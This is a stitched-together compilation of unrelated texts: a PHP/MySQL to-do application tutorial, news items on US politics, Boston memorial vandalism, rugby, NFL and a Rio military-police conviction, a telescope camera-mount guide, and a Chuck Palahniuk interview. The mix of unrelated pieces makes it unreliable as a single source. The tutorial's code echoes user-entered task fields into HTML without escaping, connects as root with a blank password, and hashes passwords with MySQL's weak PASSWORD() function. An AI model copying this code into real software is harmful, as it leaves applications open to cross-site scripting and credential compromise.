In 2006, voters overwhelmingly rejected pot legalization. But in the same election, Democrat Bill Ritter was elected after eight years of Republican rule in the governor's office, and a couple of narrow victories for Democrats to the state Legislature coincided with areas where pot activists registered dozens of young voters.
Washington and other states may see marijuana legalization on ballots this fall, but no other state considered a presidential battleground is likely to.
So far we've created some basic PHP pages and added some simple authentication. Today we're going to build on that by adding database support. This will allow us to add proper authentication to our application and start saving tasks. I should also note that I am currently writing PHP in-line and not using functions (or object orientated PHP) I will tidy this up in the next tutorial and spend more time explaining it and what it's benefits are.
Last week
Last week we installed XAMPP, so you should already have MySQL installed and ready to go. If not, please check back on the previous tutorial here. If you decided to use IIS last week, you can download MySQL using the Microsoft Web Platform Installer, you can either install phpMyAdmin or download the MySQL Workbench tool
If you have any trouble installing or configuring any of the above, please leave a comment below and I will try and help you get sorted.
Creating our schema
Assuming you've got MySQL and phpMyAdmin installed, we can start creating our schema. So far we know that we will need at least two tables. Our user table for logging in and our tasks table. We also know that a user owns a specific task, so that tells us we'll also need to use a Foreign Key to define the relationship.
First we will need a database to create our tables. A basic script to get us going would look something like this. It creates the database ‘to-do' and creates a ‘users' and a ‘tasks' table. It also defines the foreign key in the ‘tasks' table for the ‘user_id' column.
CREATE DATABASE to-do; USE to-do; CREATE TABLE IF NOT EXISTS `users` ( `user_id` bigint(20) unsigned NOT NULL auto_increment, `user_login` varchar(100) NOT NULL, `user_password` varchar(64) NOT NULL, `user_firstname` varchar(50) NOT NULL, `user_surname` varchar(50) NOT NULL, `user_email` varchar(100) NOT NULL, `user_registered` datetime NOT NULL default '0000-00-00 00:00:00', PRIMARY KEY (`user_id`), KEY `idx_user_login_key` (`user_login`) ) DEFAULT CHARSET=utf8 AUTO_INCREMENT=1; CREATE TABLE IF NOT EXISTS `tasks` ( `task_id` bigint(20) unsigned NOT NULL auto_increment, `user_id` bigint(20) NOT NULL REFERENCES `users`(`user_id`), `task_name` varchar(60) NOT NULL, `task_priority` tinyint(2) NOT NULL default '2', `task_color` varchar(7) NOT NULL default '#ffffff', `task_description` varchar(150) NULL, `task_attendees` varchar(4000) NULL, `task_date` datetime NOT NULL default '0000-00-00 00:00:00', PRIMARY KEY (`task_id`), KEY `idx_task_name_key` (`task_name`) ) DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;
To create our first user we need to insert a row into the ‘users' table. The sql below will define a user with the login ‘developerdrive'. If you have a look at the SQL you can also see it is calling the PASSWORD function. This is a built-in function for MySQL that uses the the SHA1 function to hash a string. It's recommended that you also salt a password before hashing it. Salting is the appending (or prepending) of a piece of randomly generated data to the original password (like ‘password' + ‘dhskhfkjhsdkfhskad'), this increases the randomization of the password and making it more difficult to break. If you are salting the password, you will also need to store the salt separately to the password.
Feel free to update the details below to your own, don't forget your password though!
INSERT INTO `users` ( `user_login`, `user_password`, `user_firstname`, `user_surname`, `user_email`, `user_registered` ) SELECT 'developerdrive', PASSWORD('to-do-password'), 'developer', 'drive', 'developer@email.com', NOW();
The entire script (schema.sql) including any SQL examples is included in the tutorial download at the end
Authentication
Now that we have our users table and our own login, we need to update our login.php to connect to the database and check the provided login against the ‘users' table. To do that we are going to use the MySQLi library. To create a database connection using MySQLi, you need to provide the library the MySQL database details. The default XAMPP mysql credentials are a username of “root” and a blank password. Since we're using the local database, you specify “localhost” as the server and “to-do” as the name of the database.
$connection = new mysqli("localhost", "root", "", "to-do"); if (mysqli_connect_errno()) { die(sprintf("Connect failed: %s
", mysqli_connect_error())); }
We want to be able to use this connection all over our application, so we're going to create a new file called database.php and put the following PHP in it.
<?php global $connection; if ( isset( $connection ) ) return; $connection = new mysqli("localhost", "root", "", "to-do"); if (mysqli_connect_errno()) { die(sprintf("Connect failed: %s
", mysqli_connect_error())); } ?>
We can now update out login.php file to require ‘database.php' and we can also add our first SQL query. We're going to use parameterized SQL and pass in our $username and $password variables from before. Parameterized SQL helps prevent attackers overriding your SQL using what is called a SQL Injection attack. A SQL injection attack can be quiet serious and can result in the complete loss of your data.
The SQL statement queries the ‘users' table for a ‘user_id' that has a ‘user_login' and ‘user_password' that matches the provided values. We wrap the password parameter in the PASSWORD function to make sure we only compare the hash values. If the query returns a user_id we know that the correct username and password have been provided.
if ($_SERVER['REQUEST_METHOD'] == 'POST') { require_once('database.php'); if(!empty($_POST["username"]) && !empty($_POST["password"])) { $username = $_POST["username"]; $password = $_POST["password"]; $query = $connection->prepare("SELECT `user_id` FROM `users` WHERE `user_login` = ? and `user_password` = PASSWORD(?)"); $query->bind_param("ss", $username, $password); $query->execute(); $query->bind_result($userid); $query->fetch(); $query->close(); if(!empty($userid)) { session_start(); $_SESSION["authenticated"] = 'true'; header('Location: index.php'); } else { header('Location: login.php'); } } else { header('Location: login.php'); } }
The function that actually sets the parameters in the query is the bind_param function. The first parameter (“ss” above) defines the number of parameters and their data types:
i for integer numbers e.g. 9999
d for double or decimal numbers e.g. 10.99
s for string e.g. “testing”
b for binary or blob values
The bind_result function binds a variable to the result column in the same ordinal position. In the above example I am selecting only the ‘user_id' column, if I was selecting col1, col2, col3 I could use bind_result($val1, $val2, $val3) to get their values.
While this has improved security, we still suffer from the fact that the authenticated flag is stored in session. It would be a much better idea to store the session in the database along with the expiry date (in one hour) and the IP address the user logged in from. To do this, all we have to do is create a new ‘sessions' table and insert a row that can be checked by the authenticate.php file
CREATE TABLE IF NOT EXISTS `sessions` ( `session_id` bigint(20) unsigned NOT NULL auto_increment, `user_id` bigint(20) NOT NULL REFERENCES `users`(`user_id`), `session_key` varchar(60) NOT NULL, `session_address` varchar(100) NOT NULL, `session_useragent` varchar(200) NOT NULL, `session_expires` datetime NOT NULL default '0000-00-00 00:00:00', PRIMARY KEY (`session_id`), KEY `idx_session_key` (`session_key`) ) DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;
Here's the full login.php content
<?php $username = null; $password = null; if ($_SERVER['REQUEST_METHOD'] == 'POST') { require_once('database.php'); if(!empty($_POST["username"]) && !empty($_POST["password"])) { $username = $_POST["username"]; $password = $_POST["password"]; $query = $connection->prepare("SELECT `user_id` FROM `users` WHERE `user_login` = ? and `user_password` = PASSWORD(?)"); $query->bind_param("ss", $username, $password); $query->execute(); $query->bind_result($userid); $query->fetch(); $query->close(); if(!empty($userid)) { session_start(); $session_key = session_id(); $query = $connection->prepare("INSERT INTO `sessions` ( `user_id`, `session_key`, `session_address`, `session_useragent`, `session_expires`) VALUES ( ?, ?, ?, ?, DATE_ADD(NOW(),INTERVAL 1 HOUR) );"); $query->bind_param("isss", $userid, $session_key, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT'] ); $query->execute(); $query->close(); header('Location: index.php'); } else { header('Location: login.php'); } } else { header('Location: login.php'); } } else { ?> <!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="content-type" content="text/html; charset=utf-8"> <title>Creating a simple to-do application - Part 1</title> <meta name="viewport" content="width=device-width, initial-scale=1"> </head> <body> <div id="page"> <!-- [banner] --> <header id="banner"> <hgroup> <h1>Login</h1> </hgroup> </header> <!-- [content] --> <section id="content"> <form id="login" method="post"> <label for="username">Username:</label> <input id="username" name="username" type="text" required> <label for="password">Password:</label> <input id="password" name="password" type="password" required> <br /> <input type="submit" value="Login"> </form> </section> <!-- [/content] --> <footer id="footer"> <details> <summary>Copyright 2013</summary> <p>Jonathan Schnittger. All Rights Reserved.</p> </details> </footer> </div> <!-- [/page] --> </body> </html> <?php } ?>
Now we can update authenticate.php to check for the correct session. We do this by querying for the ‘session_key', ‘session_address' and the ‘session_agent'. This way any changes to the session will be detected and the user will be asked to re-authenticate. We also confirm that the session has not expired.
<?php session_start(); $session_key = session_id(); require_once('database.php'); $query = $connection->prepare("SELECT `session_id`, `user_id` FROM `sessions` WHERE `session_key` = ? AND `session_address` = ? AND `session_useragent` = ? AND `session_expires` > NOW();"); $query->bind_param("sss", $session_key, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']); $query->execute(); $query->bind_result($session_id, $user_id); $query->fetch(); $query->close(); if(empty($session_id)) { header('Location: login.php'); } ?>
It's probably a good idea to update the session expiry date every time the user does something, this way we're not forcing them to log in every hour. If you add the following php to the end of authenticate.php the session expiry will be extended for another hour.
$query = $connection->prepare("UPDATE `sessions` SET `session_expires` = DATE_ADD(NOW(),INTERVAL 1 HOUR) WHERE `session_id` = ?;"); $query->bind_param("i", $session_id ); $query->execute(); $query->close();
It's also important to note that certain browsers share the session_id across tabs. This means that because we're storing the session in the database, if the user opens up a new tab they will automatically be logged in. If this is not the behavior you want, you can use the session_regenerate_id function to generate a new session_id
Listing and saving tasks
Now that we have authentication out of the way, we can save our first task and view a list of existing tasks. First up we'll update index.php to be able to list any existing tutorials. We need to ensure that only the tasks for the logged-in user are shown. To do this we'll use the $user_id variable we set in authentication.php. The following code is from between the table tbody tags in index.php
<?php global $user_id; $query = $connection->prepare("SELECT `task_id`, `task_name`, `task_priority`, `task_color`, `task_description`, `task_attendees`, `task_date` FROM `tasks` WHERE `user_id` = ?"); $query->bind_param("i", $user_id); $query->execute(); $query->bind_result($id, $name, $priority, $color, $description, $attendees, $date); while ($query->fetch()) { echo '<tr id="task-' . $id . '"><th scope="row" style="background-color:' . $color . '"><input type="checkbox" /></th><td>' . $date . '</td><td>' . $priority . '</td><td>' . $name . '</td><td>' . $description . '</td><td>' . $attendees . '</td></tr>'; } $query->close(); ?>
Next up is actually saving our first task. To do this we need to update submit.php. Here we're going to add an insert statement once we've validated the data submitted.
<?php require_once('authenticate.php'); $name = null; $date = date('c'); $desc = ''; $email = ''; $priority = 2; $color = '#ffffff'; $result = array(); $result['error'] = array(); if (!empty($_POST["new-task-name"])) $name = $_POST["new-task-name"]; else array_push($result['error'], 'Please specify a name for your task'); if (!empty($_POST["new-task-date"])) $date = new DateTime($_POST["new-task-date"]); else array_push($result['error'], 'Please specify a date for your task'); if (!empty($_POST["new-task-desc"])) $desc = $_POST["new-task-desc"]; if (!empty($_POST["new-task-email"])) $email = explode(',', $_POST["new-task-email"]); if (!empty($_POST["new-task-priority"])) $priority = intval($_POST["new-task-priority"]); else array_push($result['error'], 'Please specify a valid priority for your task'); if (!empty($_POST["new-task-color"])) $color = $_POST["new-task-color"]; if(isset($result['error']) && count($result['error']) > 0){ $result['success'] = false; } else { if(!empty($email)){ $email = implode(',', $email); } $date = $date->format('c'); $query = $connection->prepare("INSERT INTO `tasks` ( `user_id`, `task_name`, `task_priority`, `task_color`, `task_description`, `task_attendees`, `task_date` ) VALUES ( ?, ?, ?, ?, ?, ?, ? );"); $query->bind_param("isissss", $user_id, $name, $priority, $color, $desc, $email, $date ); $query->execute(); $result['id'] = $query->insert_id; $query->close(); $result['success'] = true; $result['name'] = $name; $result['date'] = $date; $result['desc'] = $desc; $result['email'] = $email; $result['priority'] = $priority; $result['color'] = $color; } echo json_encode($result); ?>
Here you can see that I'm returning the $query->insert_id in the $result array. This is the ‘task_id' created by when we inserted the new task
And there you have it, we've got some of the basic functionality done. We can now log in and create or view existing tasks. Next up I'll be refactoring the code to use functions and adding better error handling. We'll also be looking at adding a cron job to tidy up expired sessions and perhaps we can add in some statistics to see what features or pages our users are looking at
The New England Holocaust Memorial in Boston was vandalized for the second time since June, the Boston Globe reported on Monday.
Boston police detained a 17-year-old boy in connection with the crime, stating he is to be charged with willful and malicious destruction of property. The suspect allegedly smashed a glass panel on the New England Holocaust memorial with a rock.
In June, a vandal smashed a glass panel on one the memorial's six towers, which represent the 6 million Jews murdered in the Holocaust. The towers, which are internally lit, feature millions of numbers representing tattoos of the victims who perished at the hands of the Nazis.
“Today and every day Boston stands up against hate. I'm saddened to see such a despicable action in this great city," Boston Mayor Martin J. Walsh posted on his Twitter page.
The memorial had never been vandalized before the June incident.
The vandalism comes amid rising tension in the United States after a deadly car-ramming attack in Charlottesville on Sunday, in which a 20-year-old man drove a vehicle into a crowd protesting white nationalists, leaving one woman dead and several others injured.
The suspected driver, James Alex Fields Jr., was charged with second-degree murder, as well as three counts of malicious wounding and failing to stop at the scene of a crash that resulted in a death.
Robert Trestan, regional director of the Anti-Defamation League, called for unity in the face of adversity, in response to the act of vandalism.
“It's a reminder that we as a community need to be united, both in our opposition to all forms of hate but also in the important role that memorials play in our community,” Trestan told the Boston Globe regarding the vandalism.
“It's a second blow to the community, and it comes at a time when most of Boston is standing in solidarity [against] the hatred that we saw in Charlottesville over the weekend,” Trestan said.
ALAMEDA, Calif. -- The Oakland Raiders spent money to get better on defense and according to our ESPN panelists, it is working.
Two days into a two-week project, the Raiders have two defenders on ESPN.com's Top 100 players list. In last year's ESPN.com NFL Top 100 offensive and Top 100 defensive players, the only player to represent the Raiders was defensive back Charles Woodson.
A day after new defensive end LaMarr Woodley was ranked at No. 99, fellow new defensive end Justin Tuck comes in at No. 89. The former Giants' standout signed a two-year, $11 million deal with the Raiders.
I can see why Tuck is on this list. He has had individual success, he's been part of good defenses, and he's known as a good character player. Those are all worthy of being a top-100 player. By all amounts, Tuck is fitting in well with the Raiders on and off the field and he may be a much-needed addition.

A juíza Ana Paula Monte Figueiredo Pena Barros, da Auditoria da Justiça Militar, condenou o a major Fábio Pinto Gonçalves e o primeiro tenente Bruno César Andrade Ferreira pelo crime de constrangimento ilegal. Acusados de terem colocado morteiros na mochila de um ativista durante um protesto de professores no Centro do Rio, em setembro de 2013, eles foram condenados a um mês e seis dias de prisão. As penas, entretanto, foram suspensas pelo prazo de dois anos.
De acordo com a denúncia do Ministério Público, os PMs simularam haver encontrado em poder de um jovem três morteiros. Em razão desse fato, os militares deram voz de prisão ao rapaz e o levaram para a 5ª DP (Mem de Sá). Para a magistrada, fica claro que os PMs “contrangeram a vítima, mediante violência”, inclusive com o “uso de algemas”. Depois de divulgado o vídeo com a ação dos militares, os dois foram afastados das ruas pela corporação.
Em seu interrogatório, os militares afirmam que os morteiros foram encontrados no chão, próximo ao jovem. Eles garantem ainda que, por esse motivo, não disseram ao chegar na delegacia que os fogos estavam com ele. Segundo a sentença, durante to-do o curso do processo, os militares tentaram ainda desqualificar as testemunhas Elisa Quadros, a Sininho, e Eduardo Paparguerius, afirmando que eles são ligados a grupos que promovem manifestações “não pacíficas”.
Ana Paula explica que a menifestação do pensamento é livre, desde que de forma pacífica, não anônima e sem praticar condutas ilícitas. Ela ressalta que qualquer cidadão pode ser contrários aos governos, a Polícia Militar, pedindo, inclusive, sua desmilitarização, ou até defender a legalização das drofas. A magistrada explica que a conduta de Sininho não está sendo julgada neste processo porque as imagens feitas naquela noite mostram que ela caminhava pacificamente, obedeceu a ordem dada pelos militares de parar e, em juízo, relatou somente o que presenciou.
Richie McCaw must wish Wayne Barnes would bury his whistle and find something else to do with his weekends.
English referee Barnes was again up to his old tricks of irritating the All Blacks at Millennium Stadium - the site of their infamous World Cup quarterfinal meltdown to France in 2007 - when he inexplicably allowed Wales to repeatedly slow the game down by having their injuries treated yesterday morning.
The first half had to be extended by almost 10 minutes as the Welsh players repeatedly slumped to the deck, something that annoyed All Blacks coach Steve Hansen, captain Richie McCaw and No 8 Kieran Read.
"I thought the law said you only had to stop if it was a front rower at a scrum but every one was stopped," Hansen stated. "But, again, we can't control that so there's no point us getting too worried about it.
"We just have to adapt and adjust on the night."
McCaw, asked if he reminded the referee of his obligations, replied in a weary tone: "Fairly regularly, yeah."
And what was Barnes' response to his queries? McCaw never got the chance to answer before Hansen interjected.
"It was pretty obvious to see it. He didn't have one."
Adjusting to such madcap officiating during next year's World Cup will be crucial if the All Blacks are to have a chance of becoming the first side to defend their title.
When England toured New Zealand in June they slowed the game, and the All Blacks' momentum, by either having huddles before lineouts or waiting for a player to be treated for an ailment before allowing play to resume.
It is obvious the All Blacks operate best when they can keep the game flowing, which allows them to try and dictate the pace of the game and also exhaust their opponents.
Earlier in the week Hansen revealed the New Zealanders had taken a different tack with their approach to referees, deciding against meeting them before the tests because they felt they were not making any difference to the way the game was officiated.
He may want to review that policy if the trend of referees allowing sides to slow games down continues next year.
"Yeah, it is frustrating," Read said. "I think at every set-piece something seemed to be happening. But we have had that before this year as well with a couple of teams. What can you do. He is not going to do anything about it so you just have to carry on."
Democratic presidential nominee Hillary Clinton's lead over Republican Donald Trump is dropping even as questions grow over her use of a personal email server while serving as Secretary of State.
Clinton's chances of winning the White House are just slightly more than 77 percent, according to forecasting site FiveThirtyEight.com, which gives Trump a 23 percent chance of victory in the Nov. 8 General Election if it were held today.
While Clinton's percentage remains high, it reflects a substantial drop from just two weeks ago when the Democratic nominee's chances of defeating Trump grew to more than 90 percent.
Comey letter rocks race
Clinton's campaign was hit with a substantial blow Friday when FBI Director James Comey sent a letter to lawmakers advising them the agency was investigating "emails that appear to be pertinent" to the investigation of Clinton's use a personal email server. In July, Comey announced the FBI would not recommend charges against Clinton for using the email server, a move that drew the ire of Republicans.
Comey said the new emails were uncovered "in connection with an unrelated case." Multiple media reports have linked the emails devices used by Huma Abedin, a senior Clinton aide, and her estranged husband, former Congressman Anthony Weiner. Weiner is currently under investigation for sexting with a 15-year-old girl.
On Saturday, Clinton criticized Comey's handling of the latest revelations.
"It's pretty strange to put something like that out with such little information right before an election," Clinton said during a Florida rally Saturday. "In fact, it's not just strange, it's unprecedented and it is deeply troubling."

What the polls show...
RealClearPolitics average of major polls has Clinton up by 4.6 points over Trump - 47.1 percent to 42.5 percent. On Oct. 18, Clinton 's lead was almost 8 points.
There are more troubling numbers for the Clinton camp.
The most recent ABC News/Washington Post poll shows a growing number of Republicans are saying they will go to the polls to back their party's nominees. Earlier in October, 75 percent of people who said they were Republican were planning on going to the polls. In less than a week, that number grew to 81 percent.
The poll shows 86 percent of Republicans are now planning on supporting Trump, up from 82 percent earlier this week. More significantly, Trump has also gone from a 6 point deficit to a 16 point advantage with independent voters.
Clinton hurt at the polls?
It's too soon to see the full effect the latest email scandal could have on Clinton's campaign but Trump was already making up ground in recent days. Trump's numbers had dropped precipitously in early October after he was hit with a wave of claims that he sexually abused women.
Earlier this month, Clinton held the lead in 14 key states, including North Carolina, Nevada and Florida. The former Secretary of State still leads in each state though her margin of victory has dropped to less than 2 points in each state. Trump has taken back the lead in Arizona, Iowa, Ohio and Georgia.
How To Mount A Digital Camera To Your Telescope
One easy way to get into astrophotography is to begin with the moon. It's big and bright, and a wonderful subject for photographs. You might think that once you've photographed the moon, you're done. But each lunar cycle, the sun strikes the moon a bit different, and the moon wobbles a bit as its slightly elliptical orbit moves in closer and further away. This makes craters look different because of the different illumination angles. What you'll need is a telescope. A clock driven one is best, but for the moon, not necessarily critical. The telescope needn't be all that large, and fine moon images can be taken without a clock drive. Check out these 60mm Astrophotos for example. These moon and planet images were obtained with a 60mm telescope on a non-driven pipe-fitting mount, using a Celestron NexImage astrocamera. For a minimal setup, you can use a digital camera, but it doesn't have to be a particularly expensive one. For the moon photo examples on this page, I used my Fuji Finepics A303. For even more dramatic proof that you don't need a giant telescope to have fun with astrophotography, check out my 2 Inch Telescope Astrophotos page. The images there were obtained with a 2 inch refractor and a 35mm camera. To get the best results, you need a way to fasten your digital camera to your telescope. This page shows how to make a simple and inexpensive mount for that purpose. If you want to skip the hassle of making a camera/telescope adapter, you can just purchase a handy and adjustable digital camera mount like the Celestron 93626 Universal Digital Camera Adapter . Note that the camera shown in the following illustrations isn't my digital, I needed it to take the pictures. The stand-in is my mini-35 Olympus, which is similar in size to my digital.
The Basic Digital Camera to Telescope Mount At left you see my simple digital camera to telescope mount. It is basically a clamp made of 3/4 inch plywood and an old flash attachment holder from my 35mm camera collection. If you don't have such a flash attachment, you can make such a piece out of 1/4 inch thick tempered hardboard. It's just a piece about 1 inch wide and 6 inches long, with a slot cut in for the camera mounting screw to slide in. A 3 inch square was cut from a piece of 3/4 inch thick plywood. That square was cut into two pieces, and a V section cut from each piece. I'll get to how to measure out the cuts in a bit. Two long screws, which turn freely in the first piece they enter, allow me to clamp the mount around my telescope focuser tube. The slide slot lets me attach the camera, and then slide it into position just over the eyepiece.
Don't Cut Till You Measure What you desire is for the clamped focuser to sit centered under the camera lens as illustrated by the red line. The distance from the camera bottom to the center of the camera lens must be the same as from the mounting edge of the wood clamp to the center of the focuser when clamped. I traced around my telescope focuser on the wood square to see where it would be when clamped, then drew the V lines so they'd just touch the focuser circle. From there I could measure where to cut one edge of the plywood so my mounted camera lens would be centered over the focuser circle. Then I cut the square in two and cut out the V pieces and drilled the screw holes for the clamp.
Another View of the Digital Camera Mount Looking at the camera mount from another angle (above illustration), you can see that the holding bracket must be mounted onto the wood clamp so that the camera lens is centered over the clamp hole.
The Digital Camera Mount Fastened to Telescope The above image shows the digital camera mount fastened to my Newtonian telescope, ready to take lunar or planetary photos. Note that the wood clamp is simply tightened around the focuser. Be Careful if you try viewing through the telescope with the bracket attached. Don't bump your eye on the camera slide!!! I first focus the telescope for my relaxed eye, then mount the camera to the slide, and watch the camera LCD as I slide the camera toward the eyepiece. For low power eyepieces, you'll likely find that the camera field of view is most filled when the camera lens is about 1/4 to 1/2 inch from the eyepiece. For short focal length eyepieces, the camera lens will need to nearly touch the eyepiece. When the camera position on the slide is correct, I take a look at the eyepiece and camera lens to be sure the camera is square to the eyepiece.
Can It Really Work? You Bet Above you see a picture of the lunar Appenines taken on November 17, 2007. I was using the afocal technique, simply mounting the camera over the focused eyepiece. In this case, I was using a 9mm eyepiece on my 6 inch f/5 Newtonian. The actual image included more of the moon, but I clipped this section out as the most interesting. Compare this to the image of the same lunar region on the ETX photo page. I found that the best technique with this particular camera, which isn't designed to use a cable release, is to set the camera on highest resolution and use the timer for the photograph. In this way, the picture isn't taken when I push the shutter, which is good because pushing the shutter causes a bit of vibration. The picture is taken 10 seconds later when the vibrations have stopped. I think the picture came out well for a first try.
Here's Another Digital Camera Moon Shot Above you see another moon image taken with the digital camera mounted on my 6 inch f/5 telescope. It's the rough southern region of the moon. You can see a pretty good image of the Straight Wall in the picture. If I can do it, you can too. Get out there and start taking pictures. Just always be aware if you have the camera mount attached before you view so you don't bump into it.
Short Profile Name: Charles Michael Palahniuk
DOB: 21 February 1962
Place of Birth: Pasco, Washington, USA
Occupation: Author
Mr. Palahniuk, do you think that the world is getting better or worse?
Better. Ultimately, everyone is acting out of what they feel is the best choice. In a way, they're all trying to improve the world. And I think that those basic choices make the world a better place.
I wouldn't have necessarily guessed that from the guy who wrote Fight Club. Do you think that attitude is reflected in your fiction?
To me, it's a choice: whether to focus on the way things work out beautifully, or to focus on the way things work out miserably. I always skew to life continuing beyond the end of a story – people demonstrating their own strength and potential and increasing that over the course of the story. It's hopeful, positive. Also, my stories tend to bring people from isolation into community – with at least one other person, usually with a whole community of people – so that they find themselves accepted back by a world that they kind of fled from.
I can see that… But your stories still usually involve lots of sex and death.
I think they define one another. A comedy ends with a wedding, and a tragedy ends with a funeral: you always have to juxtapose sex and death. Like in Fight Club the boy meets the girl in a support group for terminally ill people. That's why abortion occurs so frequently in my stories. Abortion sort of synthesizes both sex and death. To have sex and death placed as close to one another as possible is always a goal of mine.
Scene from Fight Club (1999) by David Fincher, based on the novel by Chuck Palahniuk.
Is your life anywhere near as extreme as your fiction?
No, my life has been about living like a monk and looking like a priest so that people will come up to me and tell me their most appalling stories. They have to make their confession to somebody, and it might as well be me. I like it when you're not getting stories from a publication or broadcast – those are stories that everyone will know – but you're getting the secret stories that you can only get from individuals. In settings where people make confessions, like support groups, or I used to love telephone or sex chatlines, you can listen for hours to people discuss their fantasies or whatever private, horrible thing they needed to process by talking it through.
How do you get people to tell you their darkest stories?
I call it using a little fish to get a big fish. I find one story, one anecdote that I find really fascinating and I will introduce that into conversation. And each time I tell that one small anecdote, there will be someone who has a similar experience from their life, but much more extreme. People compete when they have conversation, they want their input to build on the previous contribution. So, the strange anecdote that I throw out, which is sometimes something from my own life, is instantly eclipsed by an almost identical but more extreme version from someone else's life. Then a third person will jump in and eclipse that anecdote. I'm recognizing these common events that link people in pretty much everyone's lives, and I'm looking for the most extreme versions of those.
“Writing itself should be so extreme, so wild, and so much fun that it doesn't matter whether or not you ever sell the book.”
Why the most extreme?
To illustrate that these things happen to everyone. You want to start with something that establishes a comfortable precedent that people can relate to, and then you want to move towards a version that is the ultimate version of that common experience. Also, my writing teacher told me to always take your reward up front, that the writing itself should be so extreme, so wild, and so much fun that it doesn't matter whether or not you ever sell the book.
You once said that Fight Club was just The Great Gatsby updated a little. If Gatsby was about the Lost Generation of the '20s, Fight Club about male disillusionment in the '90s, what would it be in the current culture?
I wouldn't even venture into what the current culture is. I hate the idea of writing or trying to address current events. By the time the writing is finished, those current events will be outdated. Years ago, the first time I ever visited my literary agent, he sheepishly brought out this rolling cart filled with dozens of manuscripts about priests molesting children, because that week that's what was in the news. Everyone had the same idea and they were all a complete waste of time. So, rather than try to follow current events, my goal is to try and write something new enough that it might possibly lead the culture rather than follow the culture.
Then why does your new book Beautiful You refer directly to Fifty Shades of Grey?
It's true, the working title of the book was Fifty Shades of the Twilight Cave Bear Wears Prada. I'm fascinated by the whole issue of arousal addiction, which seems to be mostly a problem for young men – videogames, pornography… The idea was to try and explore arousal addiction, but to do it in a comic, off-hand way, by depicting it with women, the population least likely to be subjected by it. I also wanted to borrow from all of this kind of “chick lit” books and use all of those tropes that are viewed so seriously.
Like what?
The lead character is a beautiful white girl and she's got a pretty black girl for her best friend, the black girl is always really sassy… These tropes are thrown at us over and over, so I thought, “Let's use these tropes as a joke and see if people recognize them.”
I think they will. That's why I would say you are definitely writing about our current moment.
I wanted to write about how so many of us, when we look back at the major events in our lives, they're not actually things that happened to us. They're our favorite movie, our favorite book, things that weren't full experiences; they were facilitated by a product that we bought. And so, I wanted to write about that. That breaks my heart a lot.
Because people are just living by proxy?
Exactly. That they find an identity in a series of products, and the experiences provided by those products, rather than by going out and having strong, unique experiences of their own. Years ago I had to buy a tombstone for my grandparents and the cemetery was showing me the new trend, which was to get the logos of different products engraved on your tombstone and that defined who you were in world. She was showing me the tombstone of a teenage girl who had died in a car accident. She had been a very good volleyball player, so her parents had had a Voit volleyball engraved on her tombstone.
I find that extremely depressing.
My grandfather had been a farmer, so the same salesperson was showing me tractors – John Deere tractors or International Harvester tractors – that I could have engraved on my grandfather's tombstone that would, you know, define him for the ages. There were pages and pages of these corporate logos that you could put on your tombstone, right by your name, right by your birth and death dates. It kind of broke my heart. This idea of people living their lives through a series of experiences provided by products was a big part of the new book. I think that the Millennials are struggling with coming up with goals and ideals of their own.
I feel like gay rights is a big issue at the moment.
That's one of the issues, but I would venture that that's just another manifestation of an equal rights issue, almost like a third wave feminism, where you take women's rights out into the larger world, and fight for them. Beyond rights, we still need a new vision to drive us.
What might that be?
I'm still waiting for that to pop up in somebody's head. That's why we have things like Burning Man. Events like Burning Man are the laboratories where people go and experiment with social structure and with identity. It's out of these little laboratories that our new culture will grow. And that's why so many of my books are about these little “liminoid” human experiments that are short-lived and are kind of fun and exciting, like party crashing in Rant, or Fight Club. It's these “liminoid” laboratories that will give us that vision, that new thing to quest for that isn't just capitalism or Marxism. You're outside of it, and in a way, you're outside of yourself. Everyone is equal and everyone is forced to participate; you can't just be a spectator.
A wrap of cocaine can cost just £25 Evidence has emerged which points to a link between cocaine use and violent behaviour in Britain's city centres. Figures from Greater Manchester Police suggest that 41% of people arrested for violence had taken cocaine or crack cocaine, by itself or with other drugs. The force took samples from 1,000 people arrested for offences such as assault, wounding and affray in the seven months to March last year. The charity DrugScope revealed the results in its magazine, DrugLink. The survey was part of an article which considered whether mixing alcohol and cocaine was a recipe for disaster. Similar findings had been reported in the Liverpool area after a separate study, run last summer by John Moores University. Aggressive behaviour Chief Inspector Dave Boon, who leads Greater Manchester Police's drug intervention programme, said while only a small number of offenders had been tested so far, the statistics were important. FROM THE BBC WORLD SERVICE Please turn on JavaScript. Media requires JavaScript to play.
More from BBC World Service "We cannot afford to ignore the link between violence, drugs and alcohol that is apparent in city centres all over the UK every weekend," he said. "What this survey is doing is trying to prove that link and developing ways to manage the problem." DrugScope chief executive Martin Barnes said: "The investigation carried out by our magazine does suggest some link between powder cocaine use and violent and aggressive behaviour. "However, because the drug is so often taken in combination with alcohol we need to be cautious about claims that cocaine alone can lead to violent offending." Cocaine is more widely used in Britain than ever, while the average price has halved in a decade. A wrap can cost as little as £25. Further research will be conducted this year, with police keen to establish whether there is a link between alcohol, cocaine and domestic violence.

WASHINGTON - To fight back the Trump administration's reported attacks on the Environmental Protection Agency, the People's Climate Movement is calling on the public to join the April 29 March for Climate, Jobs and Justice.
In undoing hard-won protections of the health of our communities and climate, the Trump administration plans to drastically slash the EPA budget by at least 20 percent, according to multiple sources. The administration's plan to eliminate one-fifth of the department would put more than 3,000 people out of work. Just this morning, EPA chief Scott Pruitt scrapped a rule requiring the oil and gas industry to report methane pollution.
Before the EPA's founding in 1970, urban cities from Los Angeles to New York City were plagued with heavy pollution, deeming them unrecognizable to the average person today. For nearly 50 years, the Environmental Protection Agency has been a crucial governmental tool in protection of the health and safety of people and planet.

Earlier this week, Trump signed an order attempting to roll back the waters of the United States rule adopted by the Obama administration, denying clean water to one out of three people in the US. Later that same evening, Trump gave his first address to Congress during which he paid lip service to clean air and water, but failed to mention the present risks of climate change.
The movements that turned out over 400,000 people into the streets of New York City for the 2014 People's Climate March are bringing the fight to Washington, DC on April 29. Through this mobilization and beyond, our broad movement will demonstrate the mass resistance to the systems that attempt to divide us, while highlighting positive solutions needed to build the brighter future we know is possible.

Not long ago, I was talking about daily life in the N.F.L. with Ryan Fitzpatrick, the veteran Tennessee Titans quarterback, who studied economics at Harvard. “It's such a physical game,” he said. “You see three-hundred-pounders hitting each other, and people think of the physicality. When people see the game, they think we're meatheads; they think of the way jocks acted in high school. But we spend more time studying than we do on the field.”
